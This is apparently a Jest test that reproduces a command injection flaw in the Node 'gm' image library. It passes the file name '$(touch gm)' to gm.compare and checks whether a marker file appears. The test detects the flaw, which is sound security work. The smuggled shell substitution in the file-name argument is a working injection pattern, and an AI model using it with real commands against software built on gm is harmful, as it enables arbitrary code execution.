test("Command Injection in gm", (done) => {
  const gm = require("gm");
  const fs = require("fs");
  const path = "./gm";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  var file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  gm.compare("$(touch gm)", "/path/to/another.png", function (
    err,
    isEqual,
    equality,
    raw,
    path1,
    path2
  ) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
